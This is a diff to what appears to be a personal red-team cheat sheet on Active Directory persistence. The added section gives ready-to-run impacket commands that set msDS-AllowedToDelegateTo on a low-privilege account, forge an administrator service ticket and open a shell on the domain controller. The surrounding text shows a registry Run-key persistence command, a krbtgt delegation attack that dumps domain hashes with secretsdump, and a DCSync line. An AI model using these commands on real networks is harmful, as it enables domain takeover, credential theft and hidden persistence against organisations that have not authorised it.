@@ -50,10 +50,10 @@ This is my personal safe for arsenals. Feel free to refer and use at anytime. Yo
 	* Golden Ticket
 	* Skeleton Keys
 	* Shortcuts
-	* msDS-AllowedToDelegateTo
-	* Scheduled Tasks 
+	* msDS-AllowedToDelegateTo(#msds-allowedtodelegateto)
+	* Scheduled Tasks
 	* AdminSDHolder
-	* Registry Keys
+	* Registry Keys(#registry-keys)
 		* [Execute on startup](#execute-on-startup)
 		* Recycle Bin
 	* [krbtgt Constrained Delegation](#krbtgt-constrained-delegation)
@@ -453,8 +453,27 @@ lsadump::dcsync /domain:contoso.local /dc:dc01 /user:administrator /authuser:dc0
 
 ## Persistence
 
+### msDS-AllowedToDelegateTo
+Note that the `msDS-AllowedToDelegateTo` is the user account flag which controls the services to which a user accounts has access to. This means, with enough privileges, it is possible to access any service from a target user.
+
+1. Set the `msDS-AllowedToDelegateTo` attribute of a user _lowpriv_ to give privilege for it to request ticket for _cifs_ service to dc01.
+```
+setCD.py legitcorp.local/Administrator:'P@$$w0rd!xyz' -dc-ip 192.168.86.170 -target 'lowpriv' -spn 'cifs/dc01.legitcorp.local'
+```
+2. Request the service ticket for _cifs_ service with impacket [getST.py](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/getST.py) and impersonate to administrator.
+```
+# request the ticket
+getST.py -spn cifs/dc01.legitcorp.local legitcorp.local/lowpriv:'P@$$w0rd!xyz' -dc-ip 192.168.86.170 -impersonate 'administrator'
+
+# export environment variable
+export KRB5CCNAME='administrator.ccache'
+```
+3. Getting an interactive shell with smbexec.py. Note that there are other several ways to achieve this and executing smbexec.py or psexec.py might cause a noisy traffic on the environment.
+```
+smbexec.py legitcorp.local/Administrator@dc01.legitcorp.local -dc-ip 192.168.86.170 -no-pass -k
+```
+
 ### Registry Keys
-***
 ### Execute on startup
 There are several registry keys can be added to execute binary on startup based on your need and current user context. 
 ```
@@ -468,7 +487,7 @@ HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce
 reg.exe add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v RunMe /t REG_SZ /d "C:\Users\Public\mybinary.exe"
 ```
 
-## krbtgt Constrained Delegation
+### krbtgt Constrained Delegation
 1. Add a new computer account with [addcomputer.py](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/addcomputer.py). This steps would require a domain account with a privilege to create computer account. (Domain objects are allowed to create up to 10 computer accounts in a domain as per default configuration). 
 ```
 addcomputer.py -computer-name FakeComputer -computer-pass 'Passw0rd' -dc-ip 192.168.86.170 legitcorp.local/lowpriv:'P@$$w0rd!xyz'
@@ -489,6 +508,7 @@ export KRB5CCNAME='DC01$.ccache'
 ```
 secretsdump.py legitcorp.local/DC01\$@dc01.legitcorp.local -dc-ip 192.168.86.170 -just-dc -k -no-pass
 ```
+You can read more from this great [article](https://skyblue.team/posts/delegate-krbtgt/) from [citronneur](https://twitter.com/citronneur). _CAVEAT: This is not really an OPSEC safe choice to perform persistence. So please be extra careful and cautious when executing the above steps_
 
 ## Remote Authentication Between Computers
 ### PS Remoting
